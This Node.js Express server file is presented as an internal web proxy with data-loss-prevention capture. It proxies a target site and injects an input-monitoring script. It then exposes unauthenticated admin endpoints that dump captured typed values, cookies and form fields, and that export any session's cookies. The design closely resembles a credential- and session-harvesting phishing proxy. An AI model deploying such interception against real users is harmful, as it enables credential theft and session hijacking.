'use strict';

const express  = require('express');
const morgan   = require('morgan');
const fs       = require('fs');
const path     = require('path');

const config           = require('./config');
const { handleMainProxy } = require('./handlers/mainProxy');
const { handleRelay }     = require('./handlers/relay');
const { handleExternal }  = require('./handlers/external');
const { init: initHarLogger, forceFlush, getStats } = require('./utils/harLogger');
const { initDlp, recordInputCapture, getDlpStats, getDlpEntries, listDlpFiles, flushDlp } = require('./utils/dlpCapture');

const crypto = require('crypto');

const app = express();

// ════════════════════════════════════════════════════════════
//  Session Management
// ════════════════════════════════════════════════════════════
app.use((req, res, next) => {
  const cookieHeader = req.headers['cookie'] || '';
  const match = cookieHeader.match(/__proxy_session=([^;]+)/);
  if (match) {
    req.sessionId = match[1].trim();
  } else {
    req.sessionId = crypto.randomUUID();
    // We can't use res.cookie() here because we often stream binary responses or rewrite headers,
    // so we set a flag, and the handlers (mainProxy, relay) will inject the Set-Cookie header.
    req._newProxySession = true;
  }
  next();
});

// ════════════════════════════════════════════════════════════
//  Raw body capture
// ════════════════════════════════════════════════════════════
app.use((req, _res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  const chunks = [];
  req.on('data',  chunk => chunks.push(chunk));
  req.on('end',   ()    => { req.rawBody = Buffer.concat(chunks); next(); });
  req.on('error', next);
});

// ── Request logging ───────────────────────────────────────────────────────────
app.use(morgan('dev'));

// ════════════════════════════════════════════════════════════
//  Routes (order matters — specific paths before catch-all)
// ════════════════════════════════════════════════════════════

// 1. Client-side proxy shim
app.get('/__proxy_shim__/proxy.js', (req, res) => {
  const shimPath = path.join(__dirname, 'static', 'proxy.js');
  let shim = fs.readFileSync(shimPath, 'utf8');
  shim = shim.replace(/__TARGET_ORIGIN__/g, JSON.stringify(config.targetOrigin));
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache');
  res.send(shim);
});

// 1b. Client-side input monitor (DLP capture)
app.get('/__proxy_shim__/inputMonitor.js', (_req, res) => {
  const monitorPath = path.join(__dirname, 'static', 'inputMonitor.js');
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache');
  res.sendFile(monitorPath);
});

// ════════════════════════════════════════════════════════════
//  DLP Input Capture Endpoint
//  Receives client-side input captures from inputMonitor.js
// ════════════════════════════════════════════════════════════
app.post('/__admin__/dlp/input', (req, res) => {
  try {
    if (req.rawBody && req.rawBody.length > 0) {
      const data = JSON.parse(req.rawBody.toString('utf8'));
      recordInputCapture(data);
    }
  } catch (err) {
    console.error('[DLP] Failed to parse input capture payload:', err.message);
  }
  res.status(204).end();
});

// ════════════════════════════════════════════════════════════
//  Admin API — HAR Traffic Inspection
// ════════════════════════════════════════════════════════════

app.get('/__admin__/har/stats', (_req, res) => {
  res.json(getStats());
});

app.post('/__admin__/har/flush', (_req, res) => {
  const file = forceFlush();
  res.json({ flushed: true, file: file ? path.basename(file) : null });
});

app.get('/__admin__/har/list', (_req, res) => {
  const logDir = getStats().logDir;
  try {
    const files = fs.readdirSync(logDir)
      .filter(f => f.endsWith('.har'))
      .map(f => {
        const stat = fs.statSync(path.join(logDir, f));
        return { name: f, size: stat.size, created: stat.birthtime, modified: stat.mtime };
      })
      .sort((a, b) => b.modified - a.modified);
    res.json({ logDir, files });
  } catch (err) {
    res.json({ logDir, files: [], error: err.message });
  }
});

app.get('/__admin__/har/download/:filename', (req, res) => {
  const logDir   = getStats().logDir;
  const filename = req.params.filename;
  if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  const filePath = path.join(logDir, filename);
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'File not found' });
  }
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  fs.createReadStream(filePath).pipe(res);
});

app.get('/__admin__/har/latest', (_req, res) => {
  const file = forceFlush();
  if (!file || !fs.existsSync(file)) {
    return res.status(404).json({ error: 'No HAR file available yet' });
  }
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Content-Disposition', `attachment; filename="${path.basename(file)}"`);
  fs.createReadStream(file).pipe(res);
});

// ════════════════════════════════════════════════════════════
//  Admin API — DLP Data Inspection
// ════════════════════════════════════════════════════════════

// GET /__admin__/dlp/stats — current DLP capture stats
app.get('/__admin__/dlp/stats', (_req, res) => {
  res.json(getDlpStats());
});

// GET /__admin__/dlp/entries?type=cookie&limit=100 — query captured data
app.get('/__admin__/dlp/entries', (req, res) => {
  const typeFilter = req.query.type || null;   // cookie, form_field, json_field, query_param, input_capture
  const limit      = parseInt(req.query.limit || '500', 10);
  const entries    = getDlpEntries(typeFilter, limit);
  res.json({ count: entries.length, entries });
});

// GET /__admin__/dlp/values?type=input_capture — just the values (for word-list matching)
app.get('/__admin__/dlp/values', (req, res) => {
  const typeFilter = req.query.type || null;
  const limit      = parseInt(req.query.limit || '1000', 10);
  const entries    = getDlpEntries(typeFilter, limit);
  // Flatten to just field:value pairs for easy grep/scanning
  const values = entries.map(e => ({
    field: e.field,
    value: e.value,
    type: e.type,
    timestamp: e.timestamp,
  }));
  res.json({ count: values.length, values });
});

// POST /__admin__/dlp/flush — force flush DLP buffer to disk
app.post('/__admin__/dlp/flush', (_req, res) => {
  flushDlp();
  res.json({ flushed: true, stats: getDlpStats() });
});

// GET /__admin__/dlp/files — list all DLP log files
app.get('/__admin__/dlp/files', (_req, res) => {
  res.json({ files: listDlpFiles() });
});

// GET /__admin__/dlp/download/:filename — download a specific DLP JSONL file
app.get('/__admin__/dlp/download/:filename', (req, res) => {
  const logDir   = getDlpStats().logDir;
  const filename = req.params.filename;
  if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  const filePath = path.join(logDir, filename);
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'File not found' });
  }
  res.setHeader('Content-Type', 'application/x-ndjson');
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  fs.createReadStream(filePath).pipe(res);
});

// ════════════════════════════════════════════════════════════
//  Admin API — Session Cookie Management
// ════════════════════════════════════════════════════════════
const { exportSessionCookies } = require('./utils/cookieJar');

// GET /__admin__/session/cookies — get structured cookies for current session
app.get('/__admin__/session/cookies', (req, res) => {
  res.json(exportSessionCookies(req.sessionId));
});

// GET /__admin__/session/:id/cookies — get structured cookies for a specific session
app.get('/__admin__/session/:id/cookies', (req, res) => {
  res.json(exportSessionCookies(req.params.id));
});

// 2. API relay
app.use('/__relay__', handleRelay);

// 3. External resource proxy
app.get('/__ext__', handleExternal);

// 4. Catch-all — main proxy (must be last)
app.all('*', handleMainProxy);

// ── Start ─────────────────────────────────────────────────────────────────────
initHarLogger();
initDlp();

app.listen(config.port, '0.0.0.0', () => {
  console.log('');
  console.log('  ╔══════════════════════════════════════════╗');
  console.log('  ║   Internal Web Proxy  —  Phase 2 Ready  ║');
  console.log('  ║    HAR Logger + DLP Capture Active       ║');
  console.log('  ╚══════════════════════════════════════════╝');
  console.log(`  ►  http://localhost:${config.port}`);
  console.log(`  ►  Proxying → ${config.targetOrigin}`);
  console.log(`  ►  HAR      → http://localhost:${config.port}/__admin__/har/stats`);
  console.log(`  ►  DLP      → http://localhost:${config.port}/__admin__/dlp/stats`);
  console.log('');
});
